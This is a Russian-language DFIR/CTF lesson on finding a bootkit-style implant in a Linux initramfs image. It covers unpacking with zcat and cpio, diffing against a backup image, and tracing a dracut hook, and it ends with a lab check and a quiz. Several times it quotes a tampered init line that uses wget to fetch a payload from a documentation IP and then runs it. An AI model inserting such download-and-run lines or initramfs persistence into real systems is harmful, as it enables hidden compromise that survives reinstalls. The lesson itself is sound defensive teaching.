---
id: linux-initramfs
title: 'initramfs: код, который запускается раньше корня'
category: forensics
parent: forensics-linux-kernel
difficulty: hard
order: 3
tags: [linux, initramfs, boot, initrd, persistence, forensics]
prerequisites: [forensics-linux-artifacts-advanced]
useful_for:
  - 'CTF Forensics категория'
  - 'DFIR / Incident Response'
  - 'Анализ образов и артефактов'
estimated_minutes: 45
summary: 'Что такое initramfs, как его распаковать и найти внедрённый код, который запускается до монтирования настоящей файловой системы.'
lab:
  kind: shell
  title: 'Практика: initramfs'
  toolset: [core, grep, strings]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' answer.txt'
  hints:
    - 'Прочитай файл-артефакт: `cat <файл>`.'
    - 'Ищи строку с меткой nto{.'
    - 'Сохрани: `grep nto <файл> > answer.txt`.'
---

## Вопрос, с которого всё начинается

Ты проверил все файлы в `/etc`, `systemd`-юниты, `crontab` — чисто. А система всё равно
заражена. Причина может быть в **initramfs** — образе, который ядро распаковывает в
память до того, как смонтирует настоящий корень. Малварь там невидима обычным
инструментам.

## Наш пример: образ /boot

Начнём с того, что лежит в `/boot`.

## Шаг 1: находим образ

```
$ ls -la /boot/
-rw-r--r-- 1 root root 64M Jan 14 03:30 initramfs-6.1.0.img
-rw-r--r-- 1 root root 12M Jan 10 03:30 initramfs-6.1.0.img.bak
```

Два образа: основной и бэкап. Основной изменён 14 января в 03:30 — в то же окно, что и
другие подозрительные события. Значит, его пересобирали.

## Шаг 2: распаковываем

initramfs — это gzip-сжатый **cpio**-архив:

```
$ file initramfs-6.1.0.img
initramfs-6.1.0.img: gzip compressed data, ...
$ zcat initramfs-6.1.0.img | cpio -idm --quiet -D /tmp/initrd
$ ls /tmp/initrd | head
bin  etc  init  lib  lib64  sbin  usr
```

Получили виртуальную мини-систему. Первый исполняемый файл — `init`.

## Шаг 3: смотрим init

`init` — это первая программа, которую запускает ядро. В штатной системе она монтирует
корень и передаёт управление. Но её можно изменить:

```
$ cat /tmp/initrd/init | head
#!/bin/sh
mount -t proc none /proc
...
wget -q http://203.0.113.5/x -O /dev/shm/x && chmod +x /dev/shm/x && /dev/shm/x &
exec switch_root /sysroot /sbin/init
```

Строка `wget ... | /dev/shm/x` — внедрённый код. Он скачивает и запускает нагрузку до
того, как смонтирован настоящий корень, — потому и не виден в обычных логах.

## Шаг 4: что ещё изменено

Сравниваем с бэкапом:

```
$ zcat initramfs-6.1.0.img.bak | cpio -idm --quiet -D /tmp/initrd_bak
$ diff -rq /tmp/initrd /tmp/initrd_bak
Files /tmp/initrd/init and /tmp/initrd_bak/init differ
Only in /tmp/initrd/usr/bin: x
```

Разница показывает ровно два изменения: подменённый `init` и добавленный бинарник `x`.

## Шаг 5: как это попало

Пересборка initramfs делается утилитами `dracut`/`mkinitramfs`/`update-initramfs`.
Смотрим историю:

```
$ grep -i initramfs /var/log/dpkg.log
2026-01-14 03:29:55 install dracut:amd64 ...
$ ls -la /etc/dracut.conf.d/
-rw-r--r-- 1 root root 40 Jan 14 03:28 99-hook.conf
```

Конфиг-файл `99-hook.conf` добавлен за минуту до пересборки — вот механизм.

## Что мы теперь знаем

- initramfs запускается до монтирования настоящего корня.
- Это gzip+cpio архив; распаковывается `zcat | cpio -idm`.
- Первый файл — `init`; его подмена даёт код до загрузки системы.
- Сравнение с бэкапом быстро показывает изменения.
- Пересборка оставляет следы в `dpkg.log` и `/etc/dracut.conf.d`.

## Если не сработало

- Нет бэкапа? Сравни с initramfs из пакета (`apt download linux-image-...`).
- Образ не gzip? Проверь `file` — бывает xz/zstd (`xzcat`/`zstdcat`).
- SELinux? Дополнительно смотри audit-лог.

## Что такое initramfs и почему туда прячутся

**initramfs** (initial RAM filesystem) — это сжатый cpio-архив, который загрузчик передаёт
ядру. Ядро распаковывает его в память, монтирует как временный корень и запускает
`/init`. Задача `init` — найти и смонтировать **настоящий** корень, после чего
`switch_root` передаёт управление реальной системе.

Ключевое для форензика: код из initramfs выполняется **раньше**, чем смонтирован корень,
до запуска `systemd`, до auditd, до журналов на диске. Всё, что он делает, не попадает в
обычные логи. Это делает initramfs идеальным местом для **загрузочного руткита** или
persistence-механизма, переживающего переустановку системы.

## Практика: распаковка и анализ

**1. Найти образы:**

```
$ ls -la /boot/
-rw-r--r-- 1 root root 64M Jan 14 03:30 initramfs-6.1.0.img
-rw-r--r-- 1 root root 12M Jan 10 03:30 initramfs-6.1.0.img.bak
```

Два образа — основной и бэкап. Основной изменён 14 января 03:30 — в окне атаки.

**2. Определить формат:**

```
$ file initramfs-6.1.0.img
initramfs-6.1.0.img: gzip compressed data, ...
```

Бывает gzip, xz, zstd, lz4 — тогда `unzstd`/`xz -d`/`lz4 -d` вместо `zcat`.

**3. Распаковать:**

```
$ mkdir /tmp/initrd && cd /tmp/initrd
$ zcat /boot/initramfs-6.1.0.img | cpio -idm --quiet
$ ls | head
bin  etc  init  lib  lib64  sbin  usr
```

**4. Прочитать `init`:**

```
$ head -20 /tmp/initrd/init
#!/bin/sh
mount -t proc none /proc
...
wget -q http://203.0.113.5/x -O /dev/shm/x && chmod +x /dev/shm/x && /dev/shm/x &
exec switch_root /sysroot /sbin/init
```

Строка `wget ... && /dev/shm/x` — внедрённый код: скачивает и запускает нагрузку **до**
монтирования настоящего корня.

## Дифференциальный анализ: сравнить с бэкапом

Самый быстрый способ найти изменения — сравнить с эталоном (`.bak`, образ из пакета):

```
$ mkdir /tmp/initrd_bak && cd /tmp/initrd_bak
$ zcat /boot/initramfs-6.1.0.img.bak | cpio -idm --quiet
$ diff -rq /tmp/initrd /tmp/initrd_bak
Files /tmp/initrd/init and /tmp/initrd_bak/init differ
Only in /tmp/initrd/usr/bin: x
```

Ровно два изменения: подменённый `init` и добавленный бинарник `x`. Это и есть улика —
всё остальное совпадает.

## Как это попало: следы пересборки

initramfs пересобирают утилитами `dracut`, `mkinitramfs`, `update-initramfs`. Ищем следы:

```
$ grep -i initramfs /var/log/dpkg.log
2026-01-14 03:29:55 install dracut:amd64 ...
$ ls -la /etc/dracut.conf.d/
-rw-r--r-- 1 root root 40 Jan 14 03:28 99-hook.conf
```

Конфиг `99-hook.conf`, добавленный за минуту до пересборки, — механизм внедрения. Хук
`dracut` может добавить произвольный файл/скрипт в образ. Аналогично проверяй
`/etc/initramfs-tools/hooks/` и `/etc/mkinitcpio.conf`.

## Ограничения

- **Много форматов** — gzip/xz/zstd/lz4; нужен правильный распаковщик.
- **Много версий** — образов может быть несколько (по ядрам); проверяй **все**.
- **Сборка сложна** — современный initramfs может быть «ранним cpio» + «основным cpio»;
  распаковывай оба слоя.
- **`init` — не всегда `/init`** — путь может быть `/sbin/init`, `/usr/lib/systemd/...`.
- **secure boot** — подписанный загрузчик может отклонить модифицированный образ (тогда
  атака шла через подпись/загрузчик).
- **Живой анализ** — образ можно прочитать с диска, не трогая систему.

## Практический чеклист

1. `ls -la /boot/` — найти все образы и их mtime.
2. `file` — определить формат сжатия.
3. Распаковать (`zcat|xz|zstd|lz4` + `cpio`).
4. Прочитать `init` и хуки — искать сетевые/подозрительные строки.
5. `diff -rq` с бэкапом/эталоном — точный список изменений.
6. `grep` по `dpkg.log`, `/etc/dracut.conf.d/`, `hooks/` — как пересобирали.
7. Сверить хеши образа с эталонным пакетом.

## Сценарий: загрузочный руткит в образе

Разберём инцидент целиком. Система «перезаражается» после переустановки, обычные
persistence-места чисты.

**1. Подозрение на раннее исполнение.** Проверяем, что вообще грузится до системы:

```
$ ls -la /boot/initramfs-*.img
-rw-r--r-- 1 root root 64M Jan 14 03:30 initramfs-6.1.0.img
```

mtime образа совпадает с окном атаки — образ пересобирали.

**2. Распаковываем и сравниваем.**

```
$ zcat initramfs-6.1.0.img | cpio -idm --quiet -D /tmp/a
$ zcat initramfs-6.1.0.img.bak | cpio -idm --quiet -D /tmp/b
$ diff -rq /tmp/a /tmp/b
Files /tmp/a/init and /tmp/b/init differ
Only in /tmp/a/usr/bin: x
```

**3. Читаем внедрённый код.** В `init` — скачивание и запуск бинарника; в `usr/bin/x` —
сам payload. Он стартует до `switch_root`, значит до systemd, до аудита, до логов.

**4. Механизм.** Находим хук dracut:

```
$ cat /etc/dracut.conf.d/99-hook.conf
add_dracutmodules+="evil"
```

Модуль `evil` клал в образ `x` и патчил `init`.

**5. Почему переустановка не помогает.** Образ лежит в `/boot`, отдельном разделе;
переустановка корня его не трогает, а загрузчик по-прежнему подаёт заражённый initramfs.

**6. Что делать.** Пересобрать **чистый** initramfs из эталона, заменить загрузчик, сменить
пароли, проверить `/boot` и MBR/EFI на другие изменения.

## Уровни загрузочной цепочки, которые стоит проверять

Initramfs — не единственное «раннее» место. Полный список:

| Уровень | Артефакт | Проверка |
|---------|----------|----------|
| UEFI/BIOS | NVRAM-записи, опции | `efibootmgr`, `efivarfs` |
| Bootloader | GRUB/syslinux конфиг | `/boot/grub/grub.cfg`, `cmdline` |
| Kernel | параметры, модули | `/proc/cmdline`, `lsmod` |
| initramfs | `init`, хуки | распаковка + diff |
| Root FS | systemd, rc.local | `systemctl`, юниты |

Изменение `init` в initramfs без изменения загрузчика — «мягкий» вариант; подмена
загрузчика/EFI-загрузчика — «жёсткий», переживающий даже замену диска.

## Ограничения

- **Слоистость cpio** — современный образ может содержать несколько cpio-слоёв; распакуй
  все.
- **Права root** — чтение `/boot` и пересборка требуют привилегий.
- **Secure Boot** — подпись может блокировать модификацию; тогда ищи компромисс ключей.
- **Много ядер** — образ на каждую версию ядра; проверяй все.
- **Не пересобирай «поверх»** — для чистоты возьми эталонный образ из пакета.

## Практический чеклист

1. `ls -la /boot/` — образы и их mtime.
2. `file` + распаковка (`zcat`/`xz`/`zstd`/`lz4` + `cpio`).
3. `diff -rq` с бэкапом/эталоном — точные изменения.
4. Прочитать `init` и все хуки — сетевые/подозрительные строки.
5. `grep` по `dpkg.log`, `/etc/dracut.conf.d/`, `hooks/`.
6. Проверить загрузчик (`grub.cfg`, `efibootmgr`) — не подменён ли.
7. Пересобрать чистый образ; сменить пароли.

## Почему это важно

Initramfs — редкая, но «глубокая» точка persistence: код оттуда выполняется раньше всего,
что умеет логировать, и переживает переустановку корня. Поэтому при подозрении на
загрузочный руткит образ `/boot` распаковывают и **сравнивают с эталоном** — даже
один изменённый `init` или лишний бинарник в `usr/bin` уже доказывает компромисс.

## Квиз

Проверь себя.

```quiz
- question: Когда запускается код из initramfs?
  options:
    - 'после входа в систему'
    - 'до монтирования настоящей корневой ФС'
    - 'после выключения'
    - 'в браузере'
  answer: 1
  explanation: 'initramfs — ранняя стадия загрузки, до switch_root.'
- question: Что представляет собой файл initramfs?
  options:
    - 'текстовый список'
    - 'gzip-сжатый cpio-архив'
    - 'базу данных'
    - 'образ диска'
  answer: 1
  explanation: 'Обычно это gzip/xz/zstd + cpio-архив мини-системы.'
- question: Какая программа выполняется первой внутри initramfs?
  options:
    - 'bash'
    - 'init'
    - 'systemd'
    - 'cron'
  answer: 1
  explanation: 'Ядро запускает /init из распакованного initramfs.'
- question: Как быстрее всего найти изменения в initramfs?
  options:
    - 'переустановить систему'
    - 'сравнить с бэкапом (diff -rq)'
    - 'перезагрузиться'
    - 'отключить сеть'
  answer: 1
  explanation: 'Сравнение с чистым/бэкапным образом сразу показывает отличия.'
```
